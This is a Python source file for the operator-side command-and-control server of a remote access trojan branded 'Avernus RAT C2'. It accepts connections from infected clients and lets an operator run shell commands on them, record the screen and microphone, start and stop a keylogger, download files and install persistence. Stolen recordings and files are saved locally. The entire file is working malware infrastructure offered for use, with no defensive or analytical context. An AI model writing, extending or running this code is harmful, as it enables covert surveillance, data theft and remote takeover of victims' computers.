#!/usr/bin/env python3
import socket
import threading
import time
import os
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_id = 0
        self.selected = None
        self.running = True

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(20)
        print(f"""
╔═══════════════════════════════════════════╗
║     AVERNUS RAT C2 (Rust)                ║
║     Listening on {self.host}:{self.port}        ║
╚═══════════════════════════════════════════╝
        """)
        print("Commands: help, list, select <id>, exit\n")
        threading.Thread(target=self.accept_clients, args=(server,), daemon=True).start()
        self.main_console()

    def accept_clients(self, server):
        while self.running:
            try:
                client, addr = server.accept()
                self.client_id += 1
                client_id = self.client_id
                print(f"\n[+] New connection [{client_id}] from {addr[0]}:{addr[1]}")
                threading.Thread(target=self.handle_client, args=(client, client_id), daemon=True).start()
            except:
                break

    def handle_client(self, client, client_id):
        try:
            data = client.recv(4096).decode()
            if data.startswith("REGISTER|"):
                info = data.split("|")[1]
            else:
                info = "Unknown"
            
            self.clients[client_id] = {
                'socket': client,
                'info': info,
                'last_seen': datetime.now()
            }
            print(f"[+] Client {client_id} registered: {info}")
            
            while self.running:
                try:
                    data = client.recv(8192)
                    if not data:
                        print(f"[-] Client {client_id} disconnected")
                        break
                    self.process_data(client, client_id, data)
                except:
                    break
        except:
            pass
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            client.close()

    def process_data(self, client, client_id, data):
        try:
            msg = data.decode()
            if msg.startswith("CONSOLE_OUT|"):
                print(f"\n[OUTPUT {client_id}] {msg[12:]}")
            elif msg.startswith("SCREENREC|"):
                parts = msg.split("|")
                size = int(parts[1])
                video_data = client.recv(size)
                filename = f"logs/screenrec_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                os.makedirs("logs", exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(video_data)
                print(f"\n[+] Screen record saved: {filename}")
            elif msg.startswith("AUDIO|"):
                parts = msg.split("|")
                size = int(parts[1])
                audio_data = client.recv(size)
                filename = f"logs/audio_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                os.makedirs("logs", exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(audio_data)
                print(f"\n[+] Audio saved: {filename}")
            elif msg.startswith("FILE_DATA|"):
                parts = msg.split("|")
                path = parts[1]
                size = int(parts[2])
                file_data = client.recv(size)
                filename = f"logs/{path.replace('\\', '_')}"
                os.makedirs("logs", exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(file_data)
                print(f"\n[+] File saved: {filename}")
            elif msg.startswith("KEYLOG_STARTED"):
                print(f"\n[+] Keylogger started on client {client_id}")
            elif msg.startswith("KEYLOG_STOPPED"):
                print(f"\n[-] Keylogger stopped on client {client_id}")
            elif msg.startswith("SCREENREC_ERROR"):
                print(f"\n[-] Screen record error: {msg[15:]}")
            else:
                print(f"\n[CLIENT {client_id}] {msg}")
        except Exception as e:
            print(f"Error: {e}")

    def main_console(self):
        while self.running:
            try:
                if self.selected and self.selected in self.clients:
                    prompt = f"[{self.selected}@{self.clients[self.selected]['info']}]> "
                else:
                    prompt = "Avernus> "
                cmd = input(prompt).strip()
                if not cmd:
                    continue
                if cmd == "help":
                    self.show_help()
                elif cmd == "list":
                    self.list_clients()
                elif cmd.startswith("select "):
                    self.select_client(cmd[7:])
                elif cmd == "exit":
                    self.running = False
                    break
                elif self.selected and self.selected in self.clients:
                    self.send_to_client(cmd)
                else:
                    print("[!] No client selected")
            except KeyboardInterrupt:
                self.running = False
                break

    def show_help(self):
        print("""
╔═══════════════════════════════════════════════════════════╗
║  AVERNUS C2 COMMANDS (Rust)                              ║
╠═══════════════════════════════════════════════════════════╣
║  help              - Show this help                      ║
║  list              - List connected clients              ║
║  select <id>       - Select client to control            ║
║  exit              - Shutdown C2 server                 ║
╠═══════════════════════════════════════════════════════════╣
║  CLIENT COMMANDS (when selected)                         ║
╠═══════════════════════════════════════════════════════════╣
║  shell <cmd>       - Execute command on client          ║
║  screenrec         - Record screen (10 sec video)       ║
║  mic               - Record microphone (5 sec)          ║
║  keylog_start      - Start keylogger                    ║
║  keylog_stop       - Stop keylogger                     ║
║  download <path>   - Download file from client          ║
║  persist           - Add persistence                    ║
║  info              - Get system info                    ║
║  exit_client       - Terminate client                   ║
╚═══════════════════════════════════════════════════════════╝
        """)

    def list_clients(self):
        if not self.clients:
            print("[!] No clients connected")
            return
        print("\n=== Connected Clients ===")
        print("ID  | Info")
        print("-" * 40)
        for cid, data in self.clients.items():
            print(f"{cid:3} | {data['info']}")

    def select_client(self, id_str):
        try:
            cid = int(id_str)
            if cid not in self.clients:
                print(f"[!] Client {cid} not found")
                return
            self.selected = cid
            print(f"[+] Selected: {self.clients[cid]['info']}")
        except:
            print("[!] Invalid ID")

    def send_to_client(self, cmd):
        client = self.clients[self.selected]['socket']
        if cmd.startswith("shell "):
            client.send(f"CONSOLE|{cmd[6:]}".encode())
        elif cmd == "screenrec":
            client.send(b"SCREENREC")
            print("[*] Screen recording request sent (10 sec)")
        elif cmd == "mic":
            client.send(b"MIC")
        elif cmd == "keylog_start":
            client.send(b"KEYLOG_START")
        elif cmd == "keylog_stop":
            client.send(b"KEYLOG_STOP")
        elif cmd.startswith("download "):
            client.send(f"DOWNLOAD|{cmd[9:]}".encode())
        elif cmd == "persist":
            client.send(b"PERSIST")
        elif cmd == "info":
            client.send(b"INFO")
        elif cmd == "exit_client":
            client.send(b"EXIT")
            self.selected = None
        else:
            print(f"[!] Unknown command: {cmd}")

if __name__ == "__main__":
    server = C2Server()
    server.start()